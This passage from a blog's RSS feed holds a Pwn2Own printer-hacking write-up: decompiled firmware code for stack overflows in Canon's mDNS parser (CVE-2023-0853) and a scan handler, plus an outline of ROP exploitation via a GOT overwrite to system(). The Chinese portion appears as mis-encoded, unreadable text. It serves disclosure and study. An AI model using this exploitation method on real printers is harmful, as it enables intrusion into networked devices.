    &lt;span class=&quot;n&quot;&gt;v24&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;strtol&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pagenumber&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rest_scan_send_scan_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v24&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;rest_scan_vp_thread_created&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rest_scan_send_err_reply&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;a1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;400&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ä½†ç•¶åœ¨ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[2]&lt;/code&gt; è™•ç† pathinfo æ™‚ï¼Œä¸¦æ²’æœ‰æª¢æŸ¥é•·åº¦ï¼Œä¸¦ä¸”ç›´æ¥è¤‡è£½åˆ° local buffer(first_path_info[32]) ä¸­ï¼Œå°è‡´ stack overflowã€‚&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Exploitation&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;æˆ‘å€‘å¯ä»¥æ§‹é€ å¾ˆé•·çš„ request åˆ° /Scan/Jobs/ ä¾†è§¸ç™¼æ¼æ´ï¼Œä¸¦ä¸”è©²è™•æ²’æœ‰ Stack Guard ä¹Ÿæ²’æœ‰ ASLRï¼Œå¯ä»¥ç›´æ¥è¦†è“‹ return addressï¼Œé€™é‚Šåªéœ€è¦åš ROP è¦†è“‹æ‰ strncmp çš„ GOT åˆ° system å¾Œï¼Œå°±å¯ä»¥é€é &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/Copy/{cmd}&lt;/code&gt; ä¾†åŸ·è¡Œä»»æ„æŒ‡ä»¤äº†ã€‚&lt;/p&gt;

&lt;p&gt;ä¸éæœ€çµ‚é€™å€‹æ¼æ´èˆ‡å…¶ä»–éšŠä¼æ’æ´äº†ã€‚&lt;/p&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
&lt;p&gt;å¾ Pwn2Own Austin 2021 åˆ° Pwn2Own Toronto 2022 çš„çµæœçœ‹ä¸‹ä¾†ï¼Œå°è¡¨æ©Ÿå®‰å…¨ä¾èˆŠæ˜¯å®¹æ˜“è¢«å¿½ç•¥çš„ï¼ŒçŸ­çŸ­ä¸€å¹´é–“ï¼Œèƒ½æ‰“ä¸‹å°è¡¨æ©Ÿçš„éšŠä¼ä¹Ÿå¤§å¹…å¢åŠ ï¼Œç”šè‡³åˆ°ç¬¬ä¸‰å¹´ &lt;a href=&quot;https://www.zerodayinitiative.com/blog/2023/10/23/pwn2own-toronto-2023-the-schedule&quot;&gt;Pwn2Own Toronto 2023&lt;/a&gt; ä¹Ÿé‚„æ˜¯è¢«è¨±å¤šéšŠä¼æ‰¾åˆ°æ¼æ´ï¼Œæœ€å¾Œä¹Ÿå»ºè­°å¤§å®¶å¦‚æœæœ‰ä½¿ç”¨åˆ°é€™äº› IoT è¨­å‚™ï¼Œç›¡é‡æŠŠä¸å¿…è¦çš„æœå‹™é—œé–‰ä¸¦ä¸”è¨­å¥½é˜²ç«ç‰†åŠåšå¥½æ¬Šé™æ§ç®¡ï¼Œä»¥æ¸›å°‘è¢«æ”»æ“Šçš„å¯èƒ½ã€‚&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2023/11/06/your-printer-is-not-your-printer-hacking-printers-pwn2own-part2/</link>
                <guid>https://devco.re/blog/2023/11/06/your-printer-is-not-your-printer-hacking-printers-pwn2own-part2</guid>
                <pubDate>Mon, 06 Nov 2023 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Your printer is not your printer ! - Hacking Printers at Pwn2Own Part II</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2023/11/06/your-printer-is-not-your-printer-hacking-printers-pwn2own-part2-en/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2023/11/06/your-printer-is-not-your-printer-hacking-printers-pwn2own-part2/&quot;&gt;ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Hacking Printers at Pwn2Own Toronto 2022&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Based on our &lt;a href=&quot;/blog/2023/10/05/your-printer-is-not-your-printer-hacking-printers-pwn2own-part1-en/&quot;&gt;previous research&lt;/a&gt;, we also discovered Pre-auth RCE vulnerabilities(&lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-23-553/&quot;&gt;(CVE-2023-0853&lt;/a&gt;ã€&lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-23-554/&quot;&gt;CVE-2023-0854&lt;/a&gt;) in other models of Canon printers. For the HP vulnerability, we had a collision with another team. In this section, we will detail the Canon and &lt;a href=&quot;https://nvd.nist.gov/vuln/detail/CVE-2023-35178&quot;&gt;HP vulnerabilities&lt;/a&gt; we exploited during Pwn2own Toronto.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Pwn2Own Toronto 2022 Target&lt;/li&gt;
&lt;/ul&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Target&lt;/th&gt;
      &lt;th&gt;Price&lt;/th&gt;
      &lt;th&gt;Master of Pwn Points&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;HP Collor LaserJet Pro M479fdw&lt;/td&gt;
      &lt;td&gt;$20000&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Lexmark MC3224i&lt;/td&gt;
      &lt;td&gt;$20000&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Canon imageCLASS MF743Cdw&lt;/td&gt;
      &lt;td&gt;$20000&lt;/td&gt;
      &lt;td&gt;2&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;analysis&quot;&gt;Analysis&lt;/h2&gt;

&lt;h3 id=&quot;canon&quot;&gt;Canon&lt;/h3&gt;
&lt;h4 id=&quot;firmware-extract&quot;&gt;Firmware Extract&lt;/h4&gt;

&lt;p&gt;Same as 2021, you can refer to &lt;a href=&quot;/blog/2023/10/05/your-printer-is-not-your-printer-hacking-printers-pwn2own-part1/&quot;&gt;Part I&lt;/a&gt;. The current version is v11.04.&lt;/p&gt;

&lt;h3 id=&quot;hp&quot;&gt;HP&lt;/h3&gt;
&lt;p&gt;The firmware can be obtained from HPâ€™s official &lt;a href=&quot;https://ftp.ext.hp.com/pub/networking/software/pfirmware/pfirmware.glf&quot;&gt;website&lt;/a&gt;. However, unlike in 2021, it cannot be directly extracted using binwalk. The firmware is encrypted with AES, and itâ€™s hard to decrypt directly from the information.&lt;/p&gt;

&lt;p&gt;At first, our thought was to look for the firmware of the same series to see if there was an unencrypted version. However, there was no such firmware on HPâ€™s official website that met our criteria. We initially considered tearing down the printer to dump the firmware, but during our search on Google, we stumbled upon an older mirror site. This site enabled directory listing, allowing us to access all the firmware stored on that mirror website.&lt;/p&gt;

&lt;p&gt;However, the problem was that the mirror site only mirrored up to 2016 and didnâ€™t have the latest information. Still, we later managed to glean the official directory structure from the website information, which helped us to obtain an unencrypted firmware from a similar series.â€&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231106/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After our analysis, we found decryption-related information in the Firmware from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fwupd&lt;/code&gt;. By reverse engineering, we were able to identify the encryption method and the Key. We can use the key to decrypt the target version of the Firmware.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231106/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;hp-collor-laserjet-pro-m479fdw&quot;&gt;HP Collor LaserJet Pro M479fdw&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;OS - Linux Base&lt;/li&gt;
  &lt;li&gt;ARMv7 32bit little-endian&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;vulnerability--exploitation&quot;&gt;Vulnerability &amp;amp; Exploitation&lt;/h2&gt;

&lt;h3 id=&quot;canon-1&quot;&gt;Canon&lt;/h3&gt;

&lt;h4 id=&quot;mdns-cve-2023-0853&quot;&gt;mDNS (CVE-2023-0853)&lt;/h4&gt;
&lt;p&gt;ï¼·e found a stack overflow on mDNS. mDNS protocol resolves hostnames to IP address within small networks that do not include a local name server and are usually used for Apple and IoT devices.&lt;/p&gt;

&lt;p&gt;It is enabled on Canon ImageCLASS MF743Cdw(Version 11.04) by default.&lt;/p&gt;

&lt;p&gt;Before we look at the detail of the vulnerability we need to talk about mDNS Packet Structure.&lt;/p&gt;

&lt;p&gt;mDNS is based on the DNS packet format defined in RFC1035 Section 4 for both queries and responses. mDNS queries and responses utilize the DNS header format defined in RFC1035 with exceptions noted below:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;The packet format:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    +---------------------+
    |        Header       |
    +---------------------+
    |       Question      | the question for the name server
    +---------------------+
    |        Answer       | RRs answering the question
    +---------------------+
    |      Authority      | RRs pointing toward an authority
    +---------------------+
    |      Additional     | RRs holding additional information
    +---------------------+
(diagram from https://www.ietf.org/rfc/rfc1035.txt)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;The header contains the following fields:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                                    1  1  1  1  1  1
      0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                      ID                       |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |QR|   Opcode  |AA|TC|RD|RA|   Z    |   RCODE   |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    QDCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    ANCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    NSCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                    ARCOUNT                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
(diagram from https://www.ietf.org/rfc/rfc1035.txt)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The answer section contains RRs that answer the question.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Resource record format:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                                    1  1  1  1  1  1
      0  1  2  3  4  5  6  7  8  9  0  1  2  3  4  5
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                                               |
    /                                               /
    /                      NAME                     /
    |                                               |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                      TYPE                     |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                     CLASS                     |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                      TTL                      |
    |                                               |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
    |                   RDLENGTH                    |
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--|
    /                     RDATA                     /
    /                                               /
    +--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+
(diagram from https://www.ietf.org/rfc/rfc1035.txt)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The RDATA section varies depending on the â€˜typeâ€™. When type=NSEC, its format is as follows:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;   The RDATA of the NSEC RR is as shown below:

                        1 1 1 1 1 1 1 1 1 1 2 2 2 2 2 2 2 2 2 2 3 3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   /                      Next Domain Name                         /
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   /                       Type Bit Maps                           /
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
(diagram from https://www.ietf.org/rfc/rfc4034.txt)

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;More details can reference to RFC6762.&lt;/p&gt;

&lt;p&gt;Other element is not important in this vulnerability, so we wonâ€™t explain more here. More detail can be found at &lt;a href=&quot;https://datatracker.ietf.org/doc/rfc6762/&quot;&gt;RFC6762&lt;/a&gt;, &lt;a href=&quot;https://datatracker.ietf.org/doc/rfc1035/&quot;&gt;RFC1035&lt;/a&gt; and &lt;a href=&quot;https://datatracker.ietf.org/doc/rfc4034/&quot;&gt;RFC4034&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Where is the bug&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;When Canon ImageCLASS MF743Cdw is parsing the Answer field (type NSEC) in mDNS header, there is a stack overflow.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20231106/3.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In the function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bnMdnsParseAnswers&lt;/code&gt;, it will parse answer section.&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__fastcall&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;bnMdnsParseAnswers&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mdns_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;netbios_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pmdns_header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;_WORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;anwser_rr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;rrlist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;_DWORD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nsec_buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// ------ fixed size on the stack&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    
  &lt;span class=&quot;n&quot;&gt;_mdns_packet&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mdns_packet&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p_payloadlen&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ppayloadlen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;p_mdns_header&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pmdns_header&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;anwser_cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;anwser_rr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v66&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;cur_ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;mdns_packet&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;do&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v9&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rrlist&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aBnmdnsparseans&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v10&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v67&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v11&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;anwser_cnt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v67&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kr&quot;&gt;__int16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pname&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_36&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x21&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;47&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;                         &lt;span class=&quot;c1&quot;&gt;// NSEC&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;...&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LABEL_95&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v62&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;v63&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
